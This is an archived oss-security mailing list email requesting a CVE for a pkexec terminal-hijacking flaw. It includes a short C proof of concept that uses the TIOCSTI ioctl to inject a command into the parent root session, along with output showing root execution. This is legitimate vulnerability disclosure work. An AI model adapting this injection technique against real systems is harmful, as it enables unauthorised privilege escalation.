X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1183" "Thursday" "25" "February" "2016" "12:15:11" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>" "47" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" nil nil nil "2" "2016022511:15:11" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" (number mark "U       up201407890@ Feb 25   47/1183  " thread-indent "\"[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 7263 invoked by uid 550); 25 Feb 2016 14:11:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 16035 invoked from network); 25 Feb 2016 11:16:30 -0000
Message-ID: <20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>
Date: Thu, 25 Feb 2016 12:15:11 +0100
From: up201407890@alunos.dcc.fc.up.pt
To: oss-security@lists.openwall.com
Cc: cve-assign@mitre.org
MIME-Version: 1.0
Content-Type: text/plain;
	charset=ISO-8859-1;
	DelSp="Yes";
	format="flowed"
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable
User-Agent: Internet Messaging Program (IMP) H3 (4.2)
X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
Subject: [oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl

Bug report to redhat:
https://bugzilla.redhat.com/show_bug.cgi?id=3D1300746


When executing a program via "pkexec --user nonpriv program" the=20=20
nonpriv session can
escape to the parent session by using the TIOCSTI ioctl to push=20=20
characters into the
terminal's input buffer, allowing privilege escalation.
This issue has been fixed in "su" by calling setsid() and in "sudo" by=20=20
using the
"use_pty" flag.

# cat test.c
#include <sys/ioctl.h>

int main()
{
  char *cmd =3D "id\n";
  while(*cmd)
   ioctl(0, TIOCSTI, cmd++);
}

# gcc test.c -o test
# id saken
uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)

# pkexec --user saken ./test ----> last command i type in
id
# id ----> did not type this
uid=3D0(root) gid=3D0(root) groups=3D0(root)


This is similar to CVE-2005-4890 and CVE-2013-6409

I'd like to request a CVE for this issue.

PS: I don't believe any of the previous mentions of fixes for "su" and
"sudo" would work here, since executing a shell via pkexec would make it not
have job control.

Thanks,
Federico Bento

----------------------------------------------------------------
This message was sent using IMP, the Internet Messaging Program.

